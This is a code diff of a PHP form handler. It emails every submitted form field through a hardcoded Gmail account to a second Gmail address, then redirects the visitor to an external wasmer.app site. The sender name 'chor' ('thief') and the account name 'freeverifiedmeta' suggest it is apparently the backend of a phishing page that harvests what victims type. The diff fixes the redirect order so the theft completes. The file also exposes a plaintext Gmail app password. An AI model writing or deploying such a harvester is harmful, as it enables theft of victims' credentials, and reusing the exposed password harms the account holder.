@@ -2,57 +2,50 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://fdfdfdcvxc.wasmer.app/");
-
 require 'Exception.php';
 require 'PHPMailer.php';
 require 'SMTP.php';
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Initialize an empty body for the email
-    $emailBody = '';
 
-    // Iterate through the $_POST array to collect form data
+    // Form data collect karna
+    $emailBody = '';
     foreach ($_POST as $key => $value) {
-        // Append form field name and its value to the email body
-        $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
+        $emailBody .= '<b>' . ucfirst(htmlspecialchars($key)) . ':</b> ' . htmlspecialchars($value) . '<br>';
     }
 
-
-
-    // PHPMailer object creation
     $mail = new PHPMailer(true);
+
     try {
-        // SMTP settings
+        // SMTP Settings
         $mail->isSMTP();
-        $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
+        $mail->Host       = 'smtp.gmail.com';
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'freeverifiedmeta@gmail.com'; // Replace with your email address
-        $mail->Password   = 'dtxm iggc axzz nkqs'; // Replace with your email password
-        $mail->SMTPSecure = 'tls';
+        $mail->Username   = 'freeverifiedmeta@gmail.com'; 
+        $mail->Password   = 'dtxm iggc axzz nkqs'; // Yahan apna 16-digit Gmail App Password dalein
+        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; 
         $mail->Port       = 587;
 
-
-        // Email properties
-        $mail->setFrom('freeverifiedmeta@gmail.com', 'chor');
+        // Email Headers & Recipients
+        $mail->setFrom('freeverifiedmeta@gmail.com', 'Form Notification');
         $mail->addAddress('alibrohi883@gmail.com');
-       
 
-
-      // Email recipient's address
-
-        // Email content
+        // Content
         $mail->isHTML(true);
-        $mail->Subject = 'name';
-        $mail->Body = $emailBody; // Set the email body using the collected form data
+        $mail->Subject = 'New Form Submission';
+        $mail->Body    = $emailBody;
 
-        // Send email
+        // Send Email
         $mail->send();
-        echo 'Email successfully sent using PHPMailer.';
+
+        // Email bhejne ke BAAD redirect karein
+        header("Location: https://fdfdfdcvxc.wasmer.app/");
+        exit();
+
     } catch (Exception $e) {
-        echo "Email sending failed. Error message: {$mail->ErrorInfo}";
+        echo "Email sending failed. Error: {$mail->ErrorInfo}";
     }
 } else {
-    echo "Invalid request!";
+    echo "Invalid request method.";
 }
 ?>
